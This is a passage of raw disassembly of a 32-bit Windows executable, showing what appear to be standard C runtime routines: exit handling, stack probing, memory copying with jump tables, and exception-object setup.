  402643:	83 c6 04             	add    $0x4,%esi
  402646:	3b 74 24 0c          	cmp    0xc(%esp),%esi
  40264a:	72 eb                	jb     0x402637
  40264c:	5e                   	pop    %esi
  40264d:	c3                   	ret
  40264e:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  402652:	56                   	push   %esi
  402653:	33 f6                	xor    %esi,%esi
  402655:	3b ce                	cmp    %esi,%ecx
  402657:	75 1d                	jne    0x402676
  402659:	e8 cf 1d 00 00       	call   0x40442d
  40265e:	56                   	push   %esi
  40265f:	56                   	push   %esi
  402660:	56                   	push   %esi
  402661:	56                   	push   %esi
  402662:	56                   	push   %esi
  402663:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  402669:	e8 8c eb ff ff       	call   0x4011fa
  40266e:	83 c4 14             	add    $0x14,%esp
  402671:	6a 16                	push   $0x16
  402673:	58                   	pop    %eax
  402674:	5e                   	pop    %esi
  402675:	c3                   	ret
  402676:	a1 5c d0 40 00       	mov    0x40d05c,%eax
  40267b:	3b c6                	cmp    %esi,%eax
  40267d:	74 da                	je     0x402659
  40267f:	89 01                	mov    %eax,(%ecx)
  402681:	33 c0                	xor    %eax,%eax
  402683:	5e                   	pop    %esi
  402684:	c3                   	ret
  402685:	8b 44 24 04          	mov    0x4(%esp),%eax
  402689:	56                   	push   %esi
  40268a:	33 f6                	xor    %esi,%esi
  40268c:	3b c6                	cmp    %esi,%eax
  40268e:	75 1d                	jne    0x4026ad
  402690:	e8 98 1d 00 00       	call   0x40442d
  402695:	56                   	push   %esi
  402696:	56                   	push   %esi
  402697:	56                   	push   %esi
  402698:	56                   	push   %esi
  402699:	56                   	push   %esi
  40269a:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  4026a0:	e8 55 eb ff ff       	call   0x4011fa
  4026a5:	83 c4 14             	add    $0x14,%esp
  4026a8:	6a 16                	push   $0x16
  4026aa:	58                   	pop    %eax
  4026ab:	5e                   	pop    %esi
  4026ac:	c3                   	ret
  4026ad:	39 35 5c d0 40 00    	cmp    %esi,0x40d05c
  4026b3:	74 db                	je     0x402690
  4026b5:	8b 0d 68 d0 40 00    	mov    0x40d068,%ecx
  4026bb:	89 08                	mov    %ecx,(%eax)
  4026bd:	33 c0                	xor    %eax,%eax
  4026bf:	5e                   	pop    %esi
  4026c0:	c3                   	ret
  4026c1:	83 3d 1c d9 40 00 00 	cmpl   $0x0,0x40d91c
  4026c8:	74 1a                	je     0x4026e4
  4026ca:	68 1c d9 40 00       	push   $0x40d91c
  4026cf:	e8 8c 1f 00 00       	call   0x404660
  4026d4:	85 c0                	test   %eax,%eax
  4026d6:	59                   	pop    %ecx
  4026d7:	74 0b                	je     0x4026e4
  4026d9:	ff 74 24 04          	push   0x4(%esp)
  4026dd:	ff 15 1c d9 40 00    	call   *0x40d91c
  4026e3:	59                   	pop    %ecx
  4026e4:	e8 d5 1e 00 00       	call   0x4045be
  4026e9:	68 a0 91 40 00       	push   $0x4091a0
  4026ee:	68 88 91 40 00       	push   $0x409188
  4026f3:	e8 36 ff ff ff       	call   0x40262e
  4026f8:	85 c0                	test   %eax,%eax
  4026fa:	59                   	pop    %ecx
  4026fb:	59                   	pop    %ecx
  4026fc:	75 54                	jne    0x402752
  4026fe:	56                   	push   %esi
  4026ff:	57                   	push   %edi
  402700:	68 9a 45 40 00       	push   $0x40459a
  402705:	e8 5a 1e 00 00       	call   0x404564
  40270a:	be 80 91 40 00       	mov    $0x409180,%esi
  40270f:	8b c6                	mov    %esi,%eax
  402711:	bf 84 91 40 00       	mov    $0x409184,%edi
  402716:	3b c7                	cmp    %edi,%eax
  402718:	59                   	pop    %ecx
  402719:	73 0f                	jae    0x40272a
  40271b:	8b 06                	mov    (%esi),%eax
  40271d:	85 c0                	test   %eax,%eax
  40271f:	74 02                	je     0x402723
  402721:	ff d0                	call   *%eax
  402723:	83 c6 04             	add    $0x4,%esi
  402726:	3b f7                	cmp    %edi,%esi
  402728:	72 f1                	jb     0x40271b
  40272a:	83 3d 20 d9 40 00 00 	cmpl   $0x0,0x40d920
  402731:	5f                   	pop    %edi
  402732:	5e                   	pop    %esi
  402733:	74 1b                	je     0x402750
  402735:	68 20 d9 40 00       	push   $0x40d920
  40273a:	e8 21 1f 00 00       	call   0x404660
  40273f:	85 c0                	test   %eax,%eax
  402741:	59                   	pop    %ecx
  402742:	74 0c                	je     0x402750
  402744:	6a 00                	push   $0x0
  402746:	6a 02                	push   $0x2
  402748:	6a 00                	push   $0x0
  40274a:	ff 15 20 d9 40 00    	call   *0x40d920
  402750:	33 c0                	xor    %eax,%eax
  402752:	c3                   	ret
  402753:	6a 10                	push   $0x10
  402755:	68 c8 ad 40 00       	push   $0x40adc8
  40275a:	e8 f5 17 00 00       	call   0x403f54
  40275f:	6a 08                	push   $0x8
  402761:	e8 18 0c 00 00       	call   0x40337e
  402766:	59                   	pop    %ecx
  402767:	33 ff                	xor    %edi,%edi
  402769:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40276c:	33 db                	xor    %ebx,%ebx
  40276e:	43                   	inc    %ebx
  40276f:	39 1d 9c d0 40 00    	cmp    %ebx,0x40d09c
  402775:	74 7e                	je     0x4027f5
  402777:	89 1d 98 d0 40 00    	mov    %ebx,0x40d098
  40277d:	8a 45 10             	mov    0x10(%ebp),%al
  402780:	a2 94 d0 40 00       	mov    %al,0x40d094
  402785:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  402788:	75 5b                	jne    0x4027e5
  40278a:	ff 35 14 d9 40 00    	push   0x40d914
  402790:	e8 37 f9 ff ff       	call   0x4020cc
  402795:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402798:	ff 35 10 d9 40 00    	push   0x40d910
  40279e:	e8 29 f9 ff ff       	call   0x4020cc
  4027a3:	59                   	pop    %ecx
  4027a4:	59                   	pop    %ecx
  4027a5:	8b f0                	mov    %eax,%esi
  4027a7:	89 75 e0             	mov    %esi,-0x20(%ebp)
  4027aa:	39 7d e4             	cmp    %edi,-0x1c(%ebp)
  4027ad:	74 26                	je     0x4027d5
  4027af:	83 ee 04             	sub    $0x4,%esi
  4027b2:	89 75 e0             	mov    %esi,-0x20(%ebp)
  4027b5:	3b 75 e4             	cmp    -0x1c(%ebp),%esi
  4027b8:	72 1b                	jb     0x4027d5
  4027ba:	83 3e 00             	cmpl   $0x0,(%esi)
  4027bd:	74 f0                	je     0x4027af
  4027bf:	8b 3e                	mov    (%esi),%edi
  4027c1:	e8 fd f8 ff ff       	call   0x4020c3
  4027c6:	3b f8                	cmp    %eax,%edi
  4027c8:	74 e5                	je     0x4027af
  4027ca:	57                   	push   %edi
  4027cb:	e8 fc f8 ff ff       	call   0x4020cc
  4027d0:	59                   	pop    %ecx
  4027d1:	ff d0                	call   *%eax
  4027d3:	eb da                	jmp    0x4027af
  4027d5:	68 a8 91 40 00       	push   $0x4091a8
  4027da:	b8 a4 91 40 00       	mov    $0x4091a4,%eax
  4027df:	e8 32 fe ff ff       	call   0x402616
  4027e4:	59                   	pop    %ecx
  4027e5:	68 b0 91 40 00       	push   $0x4091b0
  4027ea:	b8 ac 91 40 00       	mov    $0x4091ac,%eax
  4027ef:	e8 22 fe ff ff       	call   0x402616
  4027f4:	59                   	pop    %ecx
  4027f5:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4027fc:	e8 1f 00 00 00       	call   0x402820
  402801:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  402805:	75 28                	jne    0x40282f
  402807:	89 1d 9c d0 40 00    	mov    %ebx,0x40d09c
  40280d:	6a 08                	push   $0x8
  40280f:	e8 92 0a 00 00       	call   0x4032a6
  402814:	59                   	pop    %ecx
  402815:	ff 75 08             	push   0x8(%ebp)
  402818:	e8 d2 fd ff ff       	call   0x4025ef
  40281d:	33 db                	xor    %ebx,%ebx
  40281f:	43                   	inc    %ebx
  402820:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  402824:	74 08                	je     0x40282e
  402826:	6a 08                	push   $0x8
  402828:	e8 79 0a 00 00       	call   0x4032a6
  40282d:	59                   	pop    %ecx
  40282e:	c3                   	ret
  40282f:	e8 65 17 00 00       	call   0x403f99
  402834:	c3                   	ret
  402835:	6a 00                	push   $0x0
  402837:	6a 00                	push   $0x0
  402839:	ff 74 24 0c          	push   0xc(%esp)
  40283d:	e8 11 ff ff ff       	call   0x402753
  402842:	83 c4 0c             	add    $0xc,%esp
  402845:	c3                   	ret
  402846:	6a 00                	push   $0x0
  402848:	6a 01                	push   $0x1
  40284a:	ff 74 24 0c          	push   0xc(%esp)
  40284e:	e8 00 ff ff ff       	call   0x402753
  402853:	83 c4 0c             	add    $0xc,%esp
  402856:	c3                   	ret
  402857:	6a 01                	push   $0x1
  402859:	6a 00                	push   $0x0
  40285b:	6a 00                	push   $0x0
  40285d:	e8 f1 fe ff ff       	call   0x402753
  402862:	83 c4 0c             	add    $0xc,%esp
  402865:	c3                   	ret
  402866:	6a 01                	push   $0x1
  402868:	6a 01                	push   $0x1
  40286a:	6a 00                	push   $0x0
  40286c:	e8 e2 fe ff ff       	call   0x402753
  402871:	83 c4 0c             	add    $0xc,%esp
  402874:	c3                   	ret
  402875:	56                   	push   %esi
  402876:	e8 48 f8 ff ff       	call   0x4020c3
  40287b:	8b f0                	mov    %eax,%esi
  40287d:	56                   	push   %esi
  40287e:	e8 df 21 00 00       	call   0x404a62
  402883:	56                   	push   %esi
  402884:	e8 fa 20 00 00       	call   0x404983
  402889:	56                   	push   %esi
  40288a:	e8 71 e8 ff ff       	call   0x401100
  40288f:	56                   	push   %esi
  402890:	e8 e4 20 00 00       	call   0x404979
  402895:	56                   	push   %esi
  402896:	e8 d4 20 00 00       	call   0x40496f
  40289b:	56                   	push   %esi
  40289c:	e8 c4 1e 00 00       	call   0x404765
  4028a1:	56                   	push   %esi
  4028a2:	e8 4d 15 00 00       	call   0x403df4
  4028a7:	56                   	push   %esi
  4028a8:	e8 a7 1e 00 00       	call   0x404754
  4028ad:	68 46 28 40 00       	push   $0x402846
  4028b2:	e8 9e f7 ff ff       	call   0x402055
  4028b7:	83 c4 24             	add    $0x24,%esp
  4028ba:	a3 38 c0 40 00       	mov    %eax,0x40c038
  4028bf:	5e                   	pop    %esi
  4028c0:	c3                   	ret
  4028c1:	cc                   	int3
  4028c2:	cc                   	int3
  4028c3:	cc                   	int3
  4028c4:	cc                   	int3
  4028c5:	cc                   	int3
  4028c6:	cc                   	int3
  4028c7:	cc                   	int3
  4028c8:	cc                   	int3
  4028c9:	cc                   	int3
  4028ca:	cc                   	int3
  4028cb:	cc                   	int3
  4028cc:	cc                   	int3
  4028cd:	cc                   	int3
  4028ce:	cc                   	int3
  4028cf:	cc                   	int3
  4028d0:	51                   	push   %ecx
  4028d1:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4028d5:	2b c8                	sub    %eax,%ecx
  4028d7:	1b c0                	sbb    %eax,%eax
  4028d9:	f7 d0                	not    %eax
  4028db:	23 c8                	and    %eax,%ecx
  4028dd:	8b c4                	mov    %esp,%eax
  4028df:	25 00 f0 ff ff       	and    $0xfffff000,%eax
  4028e4:	3b c8                	cmp    %eax,%ecx
  4028e6:	72 0a                	jb     0x4028f2
  4028e8:	8b c1                	mov    %ecx,%eax
  4028ea:	59                   	pop    %ecx
  4028eb:	94                   	xchg   %eax,%esp
  4028ec:	8b 00                	mov    (%eax),%eax
  4028ee:	89 04 24             	mov    %eax,(%esp)
  4028f1:	c3                   	ret
  4028f2:	2d 00 10 00 00       	sub    $0x1000,%eax
  4028f7:	85 00                	test   %eax,(%eax)
  4028f9:	eb e9                	jmp    0x4028e4
  4028fb:	cc                   	int3
  4028fc:	cc                   	int3
  4028fd:	cc                   	int3
  4028fe:	cc                   	int3
  4028ff:	cc                   	int3
  402900:	55                   	push   %ebp
  402901:	8b ec                	mov    %esp,%ebp
  402903:	57                   	push   %edi
  402904:	56                   	push   %esi
  402905:	8b 75 0c             	mov    0xc(%ebp),%esi
  402908:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40290b:	8b 7d 08             	mov    0x8(%ebp),%edi
  40290e:	8b c1                	mov    %ecx,%eax
  402910:	8b d1                	mov    %ecx,%edx
  402912:	03 c6                	add    %esi,%eax
  402914:	3b fe                	cmp    %esi,%edi
  402916:	76 08                	jbe    0x402920
  402918:	3b f8                	cmp    %eax,%edi
  40291a:	0f 82 a4 01 00 00    	jb     0x402ac4
  402920:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  402926:	72 1f                	jb     0x402947
  402928:	83 3d 04 d9 40 00 00 	cmpl   $0x0,0x40d904
  40292f:	74 16                	je     0x402947
  402931:	57                   	push   %edi
  402932:	56                   	push   %esi
  402933:	83 e7 0f             	and    $0xf,%edi
  402936:	83 e6 0f             	and    $0xf,%esi
  402939:	3b fe                	cmp    %esi,%edi
  40293b:	5e                   	pop    %esi
  40293c:	5f                   	pop    %edi
  40293d:	75 08                	jne    0x402947
  40293f:	5e                   	pop    %esi
  402940:	5f                   	pop    %edi
  402941:	5d                   	pop    %ebp
  402942:	e9 ce 21 00 00       	jmp    0x404b15
  402947:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40294d:	75 15                	jne    0x402964
  40294f:	c1 e9 02             	shr    $0x2,%ecx
  402952:	83 e2 03             	and    $0x3,%edx
  402955:	83 f9 08             	cmp    $0x8,%ecx
  402958:	72 2a                	jb     0x402984
  40295a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40295c:	ff 24 95 74 2a 40 00 	jmp    *0x402a74(,%edx,4)
  402963:	90                   	nop
  402964:	8b c7                	mov    %edi,%eax
  402966:	ba 03 00 00 00       	mov    $0x3,%edx
  40296b:	83 e9 04             	sub    $0x4,%ecx
  40296e:	72 0c                	jb     0x40297c
  402970:	83 e0 03             	and    $0x3,%eax
  402973:	03 c8                	add    %eax,%ecx
  402975:	ff 24 85 88 29 40 00 	jmp    *0x402988(,%eax,4)
  40297c:	ff 24 8d 84 2a 40 00 	jmp    *0x402a84(,%ecx,4)
  402983:	90                   	nop
  402984:	ff 24 8d 08 2a 40 00 	jmp    *0x402a08(,%ecx,4)
  40298b:	90                   	nop
  40298c:	98                   	cwtl
  40298d:	29 40 00             	sub    %eax,0x0(%eax)
  402990:	c4 29                	les    (%ecx),%ebp
  402992:	40                   	inc    %eax
  402993:	00 e8                	add    %ch,%al
  402995:	29 40 00             	sub    %eax,0x0(%eax)
  402998:	23 d1                	and    %ecx,%edx
  40299a:	8a 06                	mov    (%esi),%al
  40299c:	88 07                	mov    %al,(%edi)
  40299e:	8a 46 01             	mov    0x1(%esi),%al
  4029a1:	88 47 01             	mov    %al,0x1(%edi)
  4029a4:	8a 46 02             	mov    0x2(%esi),%al
  4029a7:	c1 e9 02             	shr    $0x2,%ecx
  4029aa:	88 47 02             	mov    %al,0x2(%edi)
  4029ad:	83 c6 03             	add    $0x3,%esi
  4029b0:	83 c7 03             	add    $0x3,%edi
  4029b3:	83 f9 08             	cmp    $0x8,%ecx
  4029b6:	72 cc                	jb     0x402984
  4029b8:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4029ba:	ff 24 95 74 2a 40 00 	jmp    *0x402a74(,%edx,4)
  4029c1:	8d 49 00             	lea    0x0(%ecx),%ecx
  4029c4:	23 d1                	and    %ecx,%edx
  4029c6:	8a 06                	mov    (%esi),%al
  4029c8:	88 07                	mov    %al,(%edi)
  4029ca:	8a 46 01             	mov    0x1(%esi),%al
  4029cd:	c1 e9 02             	shr    $0x2,%ecx
  4029d0:	88 47 01             	mov    %al,0x1(%edi)
  4029d3:	83 c6 02             	add    $0x2,%esi
  4029d6:	83 c7 02             	add    $0x2,%edi
  4029d9:	83 f9 08             	cmp    $0x8,%ecx
  4029dc:	72 a6                	jb     0x402984
  4029de:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4029e0:	ff 24 95 74 2a 40 00 	jmp    *0x402a74(,%edx,4)
  4029e7:	90                   	nop
  4029e8:	23 d1                	and    %ecx,%edx
  4029ea:	8a 06                	mov    (%esi),%al
  4029ec:	88 07                	mov    %al,(%edi)
  4029ee:	83 c6 01             	add    $0x1,%esi
  4029f1:	c1 e9 02             	shr    $0x2,%ecx
  4029f4:	83 c7 01             	add    $0x1,%edi
  4029f7:	83 f9 08             	cmp    $0x8,%ecx
  4029fa:	72 88                	jb     0x402984
  4029fc:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4029fe:	ff 24 95 74 2a 40 00 	jmp    *0x402a74(,%edx,4)
  402a05:	8d 49 00             	lea    0x0(%ecx),%ecx
  402a08:	6b 2a 40             	imul   $0x40,(%edx),%ebp
  402a0b:	00 58 2a             	add    %bl,0x2a(%eax)
  402a0e:	40                   	inc    %eax
  402a0f:	00 50 2a             	add    %dl,0x2a(%eax)
  402a12:	40                   	inc    %eax
  402a13:	00 48 2a             	add    %cl,0x2a(%eax)
  402a16:	40                   	inc    %eax
  402a17:	00 40 2a             	add    %al,0x2a(%eax)
  402a1a:	40                   	inc    %eax
  402a1b:	00 38                	add    %bh,(%eax)
  402a1d:	2a 40 00             	sub    0x0(%eax),%al
  402a20:	30 2a                	xor    %ch,(%edx)
  402a22:	40                   	inc    %eax
  402a23:	00 28                	add    %ch,(%eax)
  402a25:	2a 40 00             	sub    0x0(%eax),%al
  402a28:	8b 44 8e e4          	mov    -0x1c(%esi,%ecx,4),%eax
  402a2c:	89 44 8f e4          	mov    %eax,-0x1c(%edi,%ecx,4)
  402a30:	8b 44 8e e8          	mov    -0x18(%esi,%ecx,4),%eax
  402a34:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  402a38:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  402a3c:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  402a40:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  402a44:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  402a48:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  402a4c:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  402a50:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  402a54:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  402a58:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  402a5c:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  402a60:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  402a67:	03 f0                	add    %eax,%esi
  402a69:	03 f8                	add    %eax,%edi
  402a6b:	ff 24 95 74 2a 40 00 	jmp    *0x402a74(,%edx,4)
  402a72:	8b ff                	mov    %edi,%edi
  402a74:	84 2a                	test   %ch,(%edx)
  402a76:	40                   	inc    %eax
  402a77:	00 8c 2a 40 00 98 2a 	add    %cl,0x2a980040(%edx,%ebp,1)
  402a7e:	40                   	inc    %eax
  402a7f:	00 ac 2a 40 00 8b 45 	add    %ch,0x458b0040(%edx,%ebp,1)
  402a86:	08 5e 5f             	or     %bl,0x5f(%esi)
  402a89:	c9                   	leave
  402a8a:	c3                   	ret
  402a8b:	90                   	nop
  402a8c:	8a 06                	mov    (%esi),%al
  402a8e:	88 07                	mov    %al,(%edi)
  402a90:	8b 45 08             	mov    0x8(%ebp),%eax
  402a93:	5e                   	pop    %esi
  402a94:	5f                   	pop    %edi
  402a95:	c9                   	leave
  402a96:	c3                   	ret
  402a97:	90                   	nop
  402a98:	8a 06                	mov    (%esi),%al
  402a9a:	88 07                	mov    %al,(%edi)
  402a9c:	8a 46 01             	mov    0x1(%esi),%al
  402a9f:	88 47 01             	mov    %al,0x1(%edi)
  402aa2:	8b 45 08             	mov    0x8(%ebp),%eax
  402aa5:	5e                   	pop    %esi
  402aa6:	5f                   	pop    %edi
  402aa7:	c9                   	leave
  402aa8:	c3                   	ret
  402aa9:	8d 49 00             	lea    0x0(%ecx),%ecx
  402aac:	8a 06                	mov    (%esi),%al
  402aae:	88 07                	mov    %al,(%edi)
  402ab0:	8a 46 01             	mov    0x1(%esi),%al
  402ab3:	88 47 01             	mov    %al,0x1(%edi)
  402ab6:	8a 46 02             	mov    0x2(%esi),%al
  402ab9:	88 47 02             	mov    %al,0x2(%edi)
  402abc:	8b 45 08             	mov    0x8(%ebp),%eax
  402abf:	5e                   	pop    %esi
  402ac0:	5f                   	pop    %edi
  402ac1:	c9                   	leave
  402ac2:	c3                   	ret
  402ac3:	90                   	nop
  402ac4:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  402ac8:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  402acc:	f7 c7 03 00 00 00    	test   $0x3,%edi
  402ad2:	75 24                	jne    0x402af8
  402ad4:	c1 e9 02             	shr    $0x2,%ecx
  402ad7:	83 e2 03             	and    $0x3,%edx
  402ada:	83 f9 08             	cmp    $0x8,%ecx
  402add:	72 0d                	jb     0x402aec
  402adf:	fd                   	std
  402ae0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402ae2:	fc                   	cld
  402ae3:	ff 24 95 10 2c 40 00 	jmp    *0x402c10(,%edx,4)
  402aea:	8b ff                	mov    %edi,%edi
  402aec:	f7 d9                	neg    %ecx
  402aee:	ff 24 8d c0 2b 40 00 	jmp    *0x402bc0(,%ecx,4)
  402af5:	8d 49 00             	lea    0x0(%ecx),%ecx
  402af8:	8b c7                	mov    %edi,%eax
  402afa:	ba 03 00 00 00       	mov    $0x3,%edx
  402aff:	83 f9 04             	cmp    $0x4,%ecx
  402b02:	72 0c                	jb     0x402b10
  402b04:	83 e0 03             	and    $0x3,%eax
  402b07:	2b c8                	sub    %eax,%ecx
  402b09:	ff 24 85 14 2b 40 00 	jmp    *0x402b14(,%eax,4)
  402b10:	ff 24 8d 10 2c 40 00 	jmp    *0x402c10(,%ecx,4)
  402b17:	90                   	nop
  402b18:	24 2b                	and    $0x2b,%al
  402b1a:	40                   	inc    %eax
  402b1b:	00 48 2b             	add    %cl,0x2b(%eax)
  402b1e:	40                   	inc    %eax
  402b1f:	00 70 2b             	add    %dh,0x2b(%eax)
  402b22:	40                   	inc    %eax
  402b23:	00 8a 46 03 23 d1    	add    %cl,-0x2edcfcba(%edx)
  402b29:	88 47 03             	mov    %al,0x3(%edi)
  402b2c:	83 ee 01             	sub    $0x1,%esi
  402b2f:	c1 e9 02             	shr    $0x2,%ecx
  402b32:	83 ef 01             	sub    $0x1,%edi
  402b35:	83 f9 08             	cmp    $0x8,%ecx
  402b38:	72 b2                	jb     0x402aec
  402b3a:	fd                   	std
  402b3b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402b3d:	fc                   	cld
  402b3e:	ff 24 95 10 2c 40 00 	jmp    *0x402c10(,%edx,4)
  402b45:	8d 49 00             	lea    0x0(%ecx),%ecx
  402b48:	8a 46 03             	mov    0x3(%esi),%al
  402b4b:	23 d1                	and    %ecx,%edx
  402b4d:	88 47 03             	mov    %al,0x3(%edi)
  402b50:	8a 46 02             	mov    0x2(%esi),%al
  402b53:	c1 e9 02             	shr    $0x2,%ecx
  402b56:	88 47 02             	mov    %al,0x2(%edi)
  402b59:	83 ee 02             	sub    $0x2,%esi
  402b5c:	83 ef 02             	sub    $0x2,%edi
  402b5f:	83 f9 08             	cmp    $0x8,%ecx
  402b62:	72 88                	jb     0x402aec
  402b64:	fd                   	std
  402b65:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402b67:	fc                   	cld
  402b68:	ff 24 95 10 2c 40 00 	jmp    *0x402c10(,%edx,4)
  402b6f:	90                   	nop
  402b70:	8a 46 03             	mov    0x3(%esi),%al
  402b73:	23 d1                	and    %ecx,%edx
  402b75:	88 47 03             	mov    %al,0x3(%edi)
  402b78:	8a 46 02             	mov    0x2(%esi),%al
  402b7b:	88 47 02             	mov    %al,0x2(%edi)
  402b7e:	8a 46 01             	mov    0x1(%esi),%al
  402b81:	c1 e9 02             	shr    $0x2,%ecx
  402b84:	88 47 01             	mov    %al,0x1(%edi)
  402b87:	83 ee 03             	sub    $0x3,%esi
  402b8a:	83 ef 03             	sub    $0x3,%edi
  402b8d:	83 f9 08             	cmp    $0x8,%ecx
  402b90:	0f 82 56 ff ff ff    	jb     0x402aec
  402b96:	fd                   	std
  402b97:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402b99:	fc                   	cld
  402b9a:	ff 24 95 10 2c 40 00 	jmp    *0x402c10(,%edx,4)
  402ba1:	8d 49 00             	lea    0x0(%ecx),%ecx
  402ba4:	c4 2b                	les    (%ebx),%ebp
  402ba6:	40                   	inc    %eax
  402ba7:	00 cc                	add    %cl,%ah
  402ba9:	2b 40 00             	sub    0x0(%eax),%eax
  402bac:	d4 2b                	aam    $0x2b
  402bae:	40                   	inc    %eax
  402baf:	00 dc                	add    %bl,%ah
  402bb1:	2b 40 00             	sub    0x0(%eax),%eax
  402bb4:	e4 2b                	in     $0x2b,%al
  402bb6:	40                   	inc    %eax
  402bb7:	00 ec                	add    %ch,%ah
  402bb9:	2b 40 00             	sub    0x0(%eax),%eax
  402bbc:	f4                   	hlt
  402bbd:	2b 40 00             	sub    0x0(%eax),%eax
  402bc0:	07                   	pop    %es
  402bc1:	2c 40                	sub    $0x40,%al
  402bc3:	00 8b 44 8e 1c 89    	add    %cl,-0x76e371bc(%ebx)
  402bc9:	44                   	inc    %esp
  402bca:	8f                   	(bad)
  402bcb:	1c 8b                	sbb    $0x8b,%al
  402bcd:	44                   	inc    %esp
  402bce:	8e 18                	mov    (%eax),%ds
  402bd0:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  402bd4:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  402bd8:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  402bdc:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  402be0:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  402be4:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  402be8:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  402bec:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  402bf0:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  402bf4:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  402bf8:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  402bfc:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  402c03:	03 f0                	add    %eax,%esi
  402c05:	03 f8                	add    %eax,%edi
  402c07:	ff 24 95 10 2c 40 00 	jmp    *0x402c10(,%edx,4)
  402c0e:	8b ff                	mov    %edi,%edi
  402c10:	20 2c 40             	and    %ch,(%eax,%eax,2)
  402c13:	00 28                	add    %ch,(%eax)
  402c15:	2c 40                	sub    $0x40,%al
  402c17:	00 38                	add    %bh,(%eax)
  402c19:	2c 40                	sub    $0x40,%al
  402c1b:	00 4c 2c 40          	add    %cl,0x40(%esp,%ebp,1)
  402c1f:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  402c25:	c9                   	leave
  402c26:	c3                   	ret
  402c27:	90                   	nop
  402c28:	8a 46 03             	mov    0x3(%esi),%al
  402c2b:	88 47 03             	mov    %al,0x3(%edi)
  402c2e:	8b 45 08             	mov    0x8(%ebp),%eax
  402c31:	5e                   	pop    %esi
  402c32:	5f                   	pop    %edi
  402c33:	c9                   	leave
  402c34:	c3                   	ret
  402c35:	8d 49 00             	lea    0x0(%ecx),%ecx
  402c38:	8a 46 03             	mov    0x3(%esi),%al
  402c3b:	88 47 03             	mov    %al,0x3(%edi)
  402c3e:	8a 46 02             	mov    0x2(%esi),%al
  402c41:	88 47 02             	mov    %al,0x2(%edi)
  402c44:	8b 45 08             	mov    0x8(%ebp),%eax
  402c47:	5e                   	pop    %esi
  402c48:	5f                   	pop    %edi
  402c49:	c9                   	leave
  402c4a:	c3                   	ret
  402c4b:	90                   	nop
  402c4c:	8a 46 03             	mov    0x3(%esi),%al
  402c4f:	88 47 03             	mov    %al,0x3(%edi)
  402c52:	8a 46 02             	mov    0x2(%esi),%al
  402c55:	88 47 02             	mov    %al,0x2(%edi)
  402c58:	8a 46 01             	mov    0x1(%esi),%al
  402c5b:	88 47 01             	mov    %al,0x1(%edi)
  402c5e:	8b 45 08             	mov    0x8(%ebp),%eax
  402c61:	5e                   	pop    %esi
  402c62:	5f                   	pop    %edi
  402c63:	c9                   	leave
  402c64:	c3                   	ret
  402c65:	51                   	push   %ecx
  402c66:	c7 01 fc 94 40 00    	movl   $0x4094fc,(%ecx)
  402c6c:	e8 87 1f 00 00       	call   0x404bf8
  402c71:	59                   	pop    %ecx
  402c72:	c3                   	ret
  402c73:	56                   	push   %esi
  402c74:	8b f1                	mov    %ecx,%esi
  402c76:	e8 ea ff ff ff       	call   0x402c65
  402c7b:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  402c80:	74 07                	je     0x402c89
  402c82:	56                   	push   %esi
  402c83:	e8 a7 01 00 00       	call   0x402e2f
  402c88:	59                   	pop    %ecx
  402c89:	8b c6                	mov    %esi,%eax
  402c8b:	5e                   	pop    %esi
  402c8c:	c2 04 00             	ret    $0x4
  402c8f:	6a 0c                	push   $0xc
  402c91:	68 e8 ad 40 00       	push   $0x40ade8
  402c96:	e8 b9 12 00 00       	call   0x403f54
  402c9b:	8b 75 08             	mov    0x8(%ebp),%esi
  402c9e:	85 f6                	test   %esi,%esi
  402ca0:	74 75                	je     0x402d17
